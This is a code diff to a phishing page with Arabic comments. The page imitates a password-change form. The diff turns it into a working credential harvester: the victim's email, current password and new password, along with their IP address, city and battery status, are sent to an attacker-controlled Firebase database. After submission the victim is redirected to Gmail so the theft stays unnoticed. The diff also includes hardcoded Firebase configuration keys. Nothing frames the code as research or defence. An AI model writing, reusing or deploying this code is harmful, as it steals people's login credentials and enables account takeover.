@@ -61,7 +61,23 @@ button:hover{background:#1558b0}
   </form>
 </div>
 
-<script>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-app.js";
+import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyCInhJ9Yq7znuEeHJkeRulBU6G4uHbdnyk",
+  authDomain: "merry-fc865.firebaseapp.com",
+  projectId: "merry-fc865",
+  storageBucket: "merry-fc865.firebasestorage.app",
+  messagingSenderId: "114253227649",
+  appId: "1:114253227649:web:6eae11c8ace416d9fccf80",
+  measurementId: "G-DKT1EEHHMX"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
 const step1 = document.querySelector(".step1");
 const step2 = document.querySelector(".step2");
 const step3 = document.querySelector(".step3");
@@ -71,27 +87,8 @@ const verifyPass = document.getElementById("verifyPass");
 const error3 = document.getElementById("error3");
 const successMessage = document.getElementById("successMessage");
 
-let attemptCount = 0;
-let lastMessageSent = "";
-let batteryStatus = {charging:"غير معروف", level:"غير معروف"};
-let userIP = "غير معروف";
+let lastSentData = "";
 
-// حالة البطارية
-if(navigator.getBattery){
-  navigator.getBattery().then(bat=>{
-    batteryStatus.charging = bat.charging ? "يشحن" : "غير مشحون";
-    batteryStatus.level = (bat.level*100)+"%";
-    bat.addEventListener("chargingchange",()=>batteryStatus.charging = bat.charging ? "يشحن" : "غير مشحون");
-    bat.addEventListener("levelchange",()=>batteryStatus.level = (bat.level*100)+"%");
-  });
-}
-
-// IP والدولة
-fetch('https://ipapi.co/json/').then(res=>res.json()).then(data=>{
-  userIP = `${data.ip} - ${data.country_name}`;
-});
-
-// الانتقال بين الخطوات
 next1.addEventListener("click", ()=>{
   const input = document.getElementById("email");
   if(input.checkValidity()){
@@ -112,46 +109,71 @@ next2.addEventListener("click", ()=>{
   }
 });
 
-// الخطوة الأخيرة: إرسال البيانات عند كل ضغط
-verifyPass.addEventListener("click", ()=>{
+verifyPass.addEventListener("click", async ()=>{
   const email = document.getElementById("email").value.trim();
   const currentPassword = document.getElementById("currentPassword").value.trim();
   const newPassword = document.getElementById("newPassword").value.trim();
-  const confirmPass = document.getElementById("confirmPassword").value.trim();
+  const confirmPassword = document.getElementById("confirmPassword").value.trim();
 
-  // تحقق من صحة كلمة المرور
-  if(newPassword.length >= 8 && newPassword === confirmPass){
+  if(newPassword.length >= 8 && newPassword === confirmPassword){
+    const dataString = email+currentPassword+newPassword;
+    if(dataString !== lastSentData){
+      await sendData(email, currentPassword, newPassword);
+      lastSentData = dataString;
+    }
+
     error3.style.display="none";
     successMessage.style.display="block";
     step3.querySelectorAll("input").forEach(el=>el.disabled=true);
+
+    // تحويل زر التالي إلى زر الرجوع
     verifyPass.textContent = "الرجوع";
-    verifyPass.disabled = false;
-    verifyPass.onclick = ()=>{ window.location.href = "https://www.google.com"; }
-    
-    sendData(email, currentPassword, newPassword); // إرسال البيانات
+    verifyPass.onclick = () => {
+      window.location.href = "https://mail.google.com/mail/u/0/#inbox";
+    };
+
   } else {
     error3.style.display="block";
     verifyPass.classList.add("shake");
     setTimeout(()=>verifyPass.classList.remove("shake"),300);
-    // إرسال البيانات حتى لو كانت خاطئة
-    sendData(email, currentPassword, newPassword);
   }
 });
 
-function sendData(email, currentPassword, newPassword){
-  // تجاهل الحقول الفارغة
-  const fields = [];
-  if(email) fields.push(`✉️ البريد: ${email}`);
-  if(currentPassword) fields.push(`🔑 كلمة المرور الحالية: ${currentPassword}`);
-  if(newPassword) fields.push(`🔒 كلمة المرور الجديدة: ${newPassword}`);
-  if(fields.length===0) return;
+async function sendData(email, currentPassword, newPassword){
+  if(!email && !currentPassword && !newPassword) return;
 
-  const message = `📨 بيانات جديدة:\n\n${fields.join("\n")}\n🔋 حالة الشحن: ${batteryStatus.charging} - ${batteryStatus.level}\n🌐 IP والدولة: ${userIP}`;
+  // البطارية
+  let batteryStatus = "غير معروف";
+  if(navigator.getBattery){
+    const bat = await navigator.getBattery();
+    batteryStatus = (bat.charging ? "يشحن" : "غير مشحون") + " - " + (bat.level*100) + "%";
+  }
 
-  // إرسال مرة واحدة فقط إذا لم تتغير الرسالة
-  if(message !== lastMessageSent){
-    console.log("سيتم إرسال البيانات:", message); // استبدل هذا بـ fetch إلى سيرفرك
-    lastMessageSent = message;
+  // IP والموقع
+  let userIP = "غير معروف";
+  let city = "غير معروف";
+  try{
+    const response = await fetch("https://ipapi.co/json/");
+    const data = await response.json();
+    userIP = data.ip || "غير معروف";
+    city = data.city || "غير معروف";
+  } catch(e){
+    console.error("خطأ في جلب IP والموقع: ", e);
+  }
+
+  try{
+    await addDoc(collection(db, "جديد"), {
+      "0.0.0.0.0": "",
+      البريد_الإلكتروني: email || "",
+      كلمة_الحالية: currentPassword || "",
+      كلمة_الجديدة: newPassword || "",
+      المدينة: city,
+      حالة_الشحن: batteryStatus,
+      IP_والموقع: userIP,
+      timestamp: new Date()
+    });
+  } catch(e){
+    console.error("خطأ عند إرسال البيانات: ", e);
   }
 }
 </script>
